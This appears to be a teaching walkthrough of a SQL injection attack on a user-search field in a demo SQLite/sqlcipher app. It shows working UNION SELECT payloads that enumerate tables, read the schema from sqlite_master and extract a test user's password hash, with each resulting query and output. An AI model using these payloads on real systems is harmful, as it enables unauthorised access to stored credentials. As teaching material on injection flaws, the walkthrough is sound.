# Step 0

Add some user to the database. Here we call them "Karl".

## Query for searching for users
This is something that we only know if we have access to the source code. It is included here for clarity. We assume that a hacker deduced that the query looks something like this.
``` sql
SELECT user FROM credentials WHERE user LIKE '%{}%'
```
The `{}` is replaced with the user input.

The name of the table and the column are something that we will first need to find out.

# Step 1

We check if quotation marks are escaped when adding user input to the query.

## Input
``` sql
'
```

## Query after Injection
``` sql
SELECT user FROM credentials WHERE user LIKE '%'%'
```

## Result

Error: unrecognized token: "'"

## Interpretation

This input field is susceptible to SQL injection!

# Step 2

Now that we can inject arbitrary SQL code into the query, we use `UNION` to add more results to the users query. Here we want to find out some metadata. The `sqlite_master` table is a protected tablename in sqlcipher.

## Input
``` sql
' UNION SELECT name FROM sqlite_master '
```

## Query after Injection
``` sql
SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT name FROM sqlite_master '%'
```

## Result

The following users match your query: ["Karl", "credentials", "sqlite_autoindex_credentials_1"]

## Interpretation

The first result is the intended username. The second and third results are the names of tables stored in this database.

The free floating `'%'` at the end of the query is simply ignored.

# Step 3

Now that we know the name of the table, we want to know the names of its columns. Everything after and including the `WHERE` is necessary such that the type of the result matches that of the user column, which by trial and error we find to be `TEXT NOT NULL`.

## Input
``` sql
' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '
```

## Query after Injection
``` sql
SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '%'
```

## Result

The following users match your query: ["CREATE TABLE credentials (\n        user TEXT NOT NULL PRIMARY KEY,\n        password_hash TEXT NOT NULL\n    )", "Karl"]

## Interpretation

The first search result is the command the table "credentials" was created with. It contains the information that it has column names "user" and "password_hash".

# Step 3

We know the names and types of the table and columns, it is time to extract the information we are looking for.

## Input
``` sql
' UNION SELECT password_hash FROM credentials '
```

## Query after Injection
``` sql
SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT password_hash FROM credentials '%'
```

## Result

The following users match your query: ["03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4", "Karl"]

## Interpretation

This is the hashed password of Karl. From the length we can deduce that it is most probably a SHA-256 Hash.